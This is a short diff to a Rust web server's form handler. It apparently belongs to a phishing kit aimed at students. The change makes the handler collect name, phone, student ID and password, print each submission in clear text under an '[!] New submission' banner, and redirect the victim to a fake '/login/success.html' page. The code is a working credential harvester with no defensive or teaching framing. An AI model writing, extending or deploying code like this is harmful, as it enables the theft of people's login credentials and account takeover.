@@ -4,9 +4,10 @@ use serde::Deserialize;
 
 #[derive(Debug, Deserialize)]
 struct InfoForm {
-    phone: String,
     name: String,
-    email: String,
+    phone: String,
+    student_id: String,
+    password: String,
     agree: String,
 }
 
@@ -14,13 +15,15 @@ struct InfoForm {
 pub async fn submit(form: web::Form<InfoForm>) -> HttpResponse {
     println!("{}", "[!] New submission".bright_blue().bold());
     print!(
-        "\t{}: {}\n\t{}: {}\n\t{}: {}\n",
+        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
         "Name".bright_red().bold(),
         form.name,
         "Phone".bright_red().bold(),
         form.phone,
-        "Email".bright_red().bold(),
-        form.email
+        "Student ID".bright_red().bold(),
+        form.student_id,
+        "Password".bright_red().bold(),
+        form.password
     );
     HttpResponse::Found()
         .insert_header((header::LOCATION, "/login/success.html"))
